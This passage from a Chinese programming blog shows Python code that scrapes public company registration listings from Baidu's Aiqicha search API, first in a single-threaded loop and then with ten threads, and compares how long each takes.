class="string">&#x27;&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Ymg_ssr&#x27;</span>: <span class="string">&#x27;1686132225976_1686209020456_Krd2ws59qA1TALmBzJb0wdzDayRK14xrDbs2NsxGZghPtW2AaG8K4Now6K/zTfBecE9i1aegJL5KTT+cxrK6j9JK2ix9MoT8+qWljBqcj0i1PEU+RTVvgGjdlkPqamJydND6fQSkBidmHrZVhBXKSiqByC1knHzxmFJl0d+FYKOIK5Yue9P/KBLU2Q3FIF1YsrkslH8qYriHAg5MNXzRTlrU4gdLir4fXP++E+JwOUR2jkA8Mv4vTuUOG7crcKk2W+omKed78e4P6vi6j3qgdk6Pc4jel6aItYE8iTIAZCAcJNP4raFja3p6Eb/KAqre&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Zx-Open-Url&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://aiqicha.baidu.com/s/advanceSearchAjax&quot;</span></span><br><span class="line">    response = requests.get(url, headers=headers, params=params)</span><br><span class="line">    result = response.json()[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;resultList&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> result:</span><br><span class="line">        a = <span class="string">&quot;公司名称:&quot;</span>+item[<span class="string">&#x27;entName&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;注册资金:&quot;</span>+item[<span class="string">&#x27;regCap&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司类型:&quot;</span>+item[<span class="string">&#x27;entType&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司成立时间:&quot;</span>+item[<span class="string">&#x27;validityFrom&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司地址:&quot;</span>+item[<span class="string">&quot;domicile&quot;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&#x27;开业状况:&#x27;</span>+item[<span class="string">&quot;openStatus&quot;</span>]+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        f.write(a)</span><br><span class="line"></span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">        main(i)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011553015.png" alt="image.png"></p><h1 id="4-多线程爬虫"><a href="#4-多线程爬虫" class="headerlink" title="4.多线程爬虫"></a>4.多线程爬虫</h1><h3 id="1-普通爬虫"><a href="#1-普通爬虫" class="headerlink" title="1.普通爬虫"></a>1.普通爬虫</h3><p>爬取爱企查500页数据</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">n</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment">#写入文件</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./a.txt&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">    m = <span class="built_in">str</span>(n)</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;p&quot;</span>: m,</span><br><span class="line">        <span class="string">&quot;s&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;&#123;&quot;regCap&quot;:[&#123;&quot;start&quot;:5000,&quot;end&quot;:0&#125;],&quot;regCapType&quot;:[&quot;1&quot;],&quot;openStatus&quot;:[&quot;开业&quot;]&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;o&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&#x27;抓到的cookie&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;aiqicha.baidu.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua&#x27;</span>: <span class="string">&#x27;&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Ymg_ssr&#x27;</span>: <span class="string">&#x27;1686132225976_1686209020456_Krd2ws59qA1TALmBzJb0wdzDayRK14xrDbs2NsxGZghPtW2AaG8K4Now6K/zTfBecE9i1aegJL5KTT+cxrK6j9JK2ix9MoT8+qWljBqcj0i1PEU+RTVvgGjdlkPqamJydND6fQSkBidmHrZVhBXKSiqByC1knHzxmFJl0d+FYKOIK5Yue9P/KBLU2Q3FIF1YsrkslH8qYriHAg5MNXzRTlrU4gdLir4fXP++E+JwOUR2jkA8Mv4vTuUOG7crcKk2W+omKed78e4P6vi6j3qgdk6Pc4jel6aItYE8iTIAZCAcJNP4raFja3p6Eb/KAqre&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Zx-Open-Url&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://aiqicha.baidu.com/s/advanceSearchAjax&quot;</span></span><br><span class="line">    response = requests.get(url, headers=headers, params=params)</span><br><span class="line">    result = response.json()[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;resultList&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            a = <span class="string">&quot;公司名称:&quot;</span>+item[<span class="string">&#x27;entName&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;注册资金:&quot;</span>+item[<span class="string">&#x27;regCap&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司类型:&quot;</span>+item[<span class="string">&#x27;entType&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司成立时间:&quot;</span>+item[<span class="string">&#x27;validityFrom&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司地址:&quot;</span>+item[<span class="string">&quot;domicile&quot;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&#x27;开业状况:&#x27;</span>+item[<span class="string">&quot;openStatus&quot;</span>]+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">            f.write(a)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    start = time.time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">501</span>):</span><br><span class="line">        main(i)</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;直接爬取耗费时间&quot;</span>,(end-start))</span><br></pre></td></tr></table></figure><p>成功爬取5000行数据<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011554700.png" alt="image.png"></p><p>程序耗费时间<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011554254.png" alt="image.png"></p><h3 id="2-多线程爬虫"><a href="#2-多线程爬虫" class="headerlink" title="2.多线程爬虫"></a>2.多线程爬虫</h3><p>开10个线程跑</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="comment">#写入文件</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./a.txt&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    m = <span class="built_in">str</span>(n)</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;p&quot;</span>: m,</span><br><span class="line">        <span class="string">&quot;s&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;&#123;&quot;regCap&quot;:[&#123;&quot;start&quot;:5000,&quot;end&quot;:0&#125;],&quot;regCapType&quot;:[&quot;1&quot;],&quot;openStatus&quot;:[&quot;开业&quot;]&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;o&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&#x27;抓到的cookie&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;aiqicha.baidu.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua&#x27;</span>: <span class="string">&#x27;&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Ymg_ssr&#x27;</span>: <span class="string">&#x27;1686218663386_1686228429829_WB0FB0MHEc9Cck35D45asRQbQY/PoeVjFk/N0r6KlgJOBaP2AQeCctHp1+UF5PJ0r0oQ5oILGzmfycrw5JXeQkWKFeoFANP7yZEm/24Zn7bQjBOkalyujWkvRU8gYBnRfui6CEnMI6owfohQkqi47feLPDyQ304QODUtg1jr3lP0Yn+4K10FKN3G210hXv9FpwJz3ze/f6japRpezUodE+/Ac2i8kX4il0MtJjc6SRj1Smi+H0bM1xAH5/LthB1gHm0akZCD0pNskPl3oBpmNvRLcQEqf8D7heK+Krw+A1lkjfywECbMAzcktjLm9XLQHaSG+8O2W5p+F7LF0qTVHDcxw7nEkE8/Ix0zG5NnnPttJF1pvM4H4aOCoXnuARy8MuWogjpUrxI2JqjPd3Fjoz13c4usSIy1rQ5OO8BAe5syq+XIuX6+X2i9hmv4C7NwfkFPzUA0UF483F8KAgBFyVA+Pa2V8o95TjRbeCrwgLmp1q4h2tVtBtoplvnr8WKO3MG16+pHq7vcVaZzYSkxL0yIV9e0SKzgeCxmeIaFNZx2oCCtb4xND6+MRKe2VYOePXFuKYA6mG1MQ7/ZkvXz2IsG8t0dXDdZtmU0M8szb7HGxDYzXCjBXkbvmWuidBoI0xLbFSt8fBeQs2NWT0BUHwP0mRJ+52oDDTBobqYTJdZQ81bBVytZpVqeNU72/0rMnWhf2nbu0zBb4fuu5TdnClbECDrfzkzP5WQ94E5XeJSfEKw1HrmxjOKQhECNflwn8WhnkP32FDquj8e+0yLBADAVT5/dPyyeakElNGd4ZdTI10tszotkziWMyKg+qm2ST/NOpM2apFTWLxtaDePALLbwucfQ0E/aMdhYhztSbd7b28zaL0DYQEAcBwUuA4sGC3I/w63nTR00hi2n8awwTKNtpyJvvMjA1NmuwKWZvBrRLjrVwsYyFjTWVDX2cQa7u3/WHubLJo4uSuqNE3a1+FO3aGFwMZupfH7pCKA3LSRjgO829MQnzX5teielCpcywP933QFbMHbeqkn+zGXlDQ==&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Zx-Open-Url&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://aiqicha.baidu.com/s/advanceSearchAjax&quot;</span></span><br><span class="line">    response = requests.get(url, headers=headers, params=params)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = response.json()[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;resultList&quot;</span>]</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> result:</span><br><span class="line">            a = <span class="string">&quot;公司名称:&quot;</span>+item[<span class="string">&#x27;entName&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;注册资金:&quot;</span>+item[<span class="string">&#x27;regCap&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司类型:&quot;</span>+item[<span class="string">&#x27;entType&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司成立时间:&quot;</span>+item[<span class="string">&#x27;validityFrom&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司地址:&quot;</span>+item[<span class="string">&quot;domicile&quot;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&#x27;开业状况:&#x27;</span>+item[<span class="string">&quot;openStatus&quot;</span>]+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">            f.write(a)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_reptile</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> qq.empty():</span><br><span class="line">        i = qq.get()</span><br><span class="line">        main(i)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    qq = Queue()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">501</span>):</span><br><span class="line">        qq.put(i)</span><br><span class="line">    thread_number = <span class="number">10</span></span><br><span class="line">    start = time.time()</span><br><span class="line">    Threads = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(thread_number):</span><br><span class="line">        t = Thread(target=run_reptile)</span><br><span class="line">        t.start()</span><br><span class="line">        Threads.append(t)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> Threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;直接爬取耗费时间&quot;</span>,(end-start))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011555178.png" alt="image.png"></p><h1 id="5-参考文章"><a href="#5-参考文章" class="headerlink" title="5.参考文章"></a>5.参考文章</h1><p><a href="https://blog.csdn.net/weixin_45329040/article/details/121549098">python爬虫 爬取爱企查公司信息_python 爱企查_代码永不报错的博客-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> 信息搜集 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
